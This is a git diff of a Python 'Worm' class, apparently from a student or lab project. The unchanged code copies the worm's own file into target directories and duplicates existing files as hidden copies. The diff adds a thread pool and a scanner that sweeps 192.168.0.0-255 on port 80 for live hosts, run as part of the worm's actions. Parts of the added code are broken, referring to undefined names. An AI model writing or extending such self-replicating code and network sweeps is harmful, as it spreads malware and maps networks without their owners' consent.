@@ -1,9 +1,71 @@
+#General imports required for basic worm
 import os
 import sys
 import time
 import win32con
 import shutil
+import logging
 
+#Threading imports - AR
+from threading import Thread, Lock
+from time import perf_counter
+from sys import stderr
+from time import sleep
+import socket
+
+BASE_IP = "192.168.0.%i"
+PORT = 80
+
+#------------------------------------------THREADER CLASS---------------------------------------------- -AR
+class Threader:
+    
+    def __init__(self, threads=30):
+        self.thread_lock = Lock()
+        self.functions_lock = Lock()
+        self.functions = []
+        self.threads = []
+        self.nthreads = threads
+        self.running = True
+        self.print_lock = Lock()
+        
+    def stop(self) -> None:
+        # Signal all worker threads to stop
+        self.running = False
+        
+    def append(self, function, *args) -> None:
+        # Add the function to a list of functions to be run
+        self.functions.append((function, args))
+    
+    def start(self) -> None:
+        # Create a limited number of threads
+        for i in range(self.nthreads):
+            thread = Thread(target=self.worker, daemon=True)
+            # We need to pass in `thread` as a parameter so we
+            # have to use `<threading.Thread>._args` like this:
+            thread._args = (thread, )
+            self.threads.append(thread)
+            thread.start()
+    
+    def join(self) -> None:
+        # Joins the threads one by one until all of them are done.
+        for thread in self.threads:
+            thread.join()
+    
+    def worker(self, thread:Thread) -> None:
+        # While we are running and there are functions to call:
+        while self.running and (len(self.functions) > 0):
+            # Get a function
+            with self.functions_lock:
+                function, args = self.functions.pop(0)
+            # Call that function
+            function(*args)
+     
+        # Remove the thread from the list of threads.
+        with self.thread_lock:
+            self.threads.remove(thread)
+
+
+#--------------------------------------------WORM CLASS------------------------------------------------
 class Worm:
     def __init__(self, path=None, target_dir_list=None, iteration=None):
         if isinstance(path, type(None)):
@@ -21,6 +83,11 @@ class Worm:
         else: 
             self.iteration = iteration
 
+        #initialize worm threader class, start timing code executions and set the default socket timeout to 0.1 seconds -AR
+        self.threader = Threader(10)
+        self.start = perf_counter()
+        socket.setdefaulttimeout(0.1)
+        
         # get own absolute path
         self.own_path = os.path.realpath(__file__)
 
@@ -36,7 +103,7 @@ class Worm:
                 if os.path.isdir(absolute_path):
                     self.list_directories(absolute_path)
                 else:
-                    pass
+                    pass   
     
     def create_new_worm(self):
         for directory in self.target_dir_list:
@@ -53,12 +120,30 @@ class Worm:
                     for i in range(self.iteration):
                         destination = os.path.join(directory, ("."+file+str(i)))
                         shutil.copyfile(source, destination)
+                        
+    #Network Identification----- -AR
+    def connect(hostname, port):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            result = sock.connect_ex((hostname, port))
+        with threader.print_lock:
+            if result == 0:
+                stderr.write(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
+                logging.warning(f"[{perf_counter() - start:.5f}] Found {hostname}\n")
+                
+     #Network Identification Iterator----- -AR
+    def connection_iterator(self):
+        for i in range(255):
+            self.threader.append(worm.connect, BASE_IP%i, PORT)
+        self.threader.start()
+        self.threader.join()
+        logging.warning(f"[{perf_counter() - start:.5f}] Done Searching")
     
     def start_worm_actions(self):
         self.list_directories(self.path)
         print(self.target_dir_list)
         self.create_new_worm()
         self.copy_exsisting_files()
+        self.connection_iterator()
     
 if __name__=="__main__":
     current_directory = os.path.abspath("")
